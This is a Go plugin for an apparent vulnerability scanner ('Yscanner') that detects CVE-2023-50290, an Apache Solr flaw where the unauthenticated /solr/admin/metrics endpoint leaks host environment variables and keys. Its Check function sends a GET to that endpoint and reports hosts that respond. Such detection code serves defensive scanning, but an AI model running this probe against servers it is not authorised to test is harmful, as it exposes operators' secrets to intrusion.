package goplugin

import (
	"Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("apache_solr_info_leak_cve_2023_50290", &apache_solr_info_leak_cve_2023_50290{})
}

type apache_solr_info_leak_cve_2023_50290 struct{}

func (p *apache_solr_info_leak_cve_2023_50290) Info() PluginInfo {
	return PluginInfo{
		Name:     "Apache Solr 环境变量信息泄漏漏洞",
		VulnInfo: "Apache Solr 是一款开源的搜索引擎。在 Apache Solr 受影响版本中，由于 Solr Metrics API 默认输出所有未单独配置保护策略的环境变量。在默认无认证或具有 metrics-read 权限的情况下，攻击者可以通过向 /solr/admin/metrics 端点发送恶意请求，从而获取到运行 Solr 实例的主机上的所有系统环境变量，包括敏感信息的配置、密钥等。",
		VulnID:   "CVE-2023-50290",
		Level:    "6.5 MEDIUM",
		URL:      "",
		Version:  "9.0.0 <= Apache Solr < 9.0.3",
		CWE:      "CWE-200	信息暴露",
	}
}

func (p *apache_solr_info_leak_cve_2023_50290) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/solr/admin/metrics", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, "metrics") {
		return true
	}
	return false
}
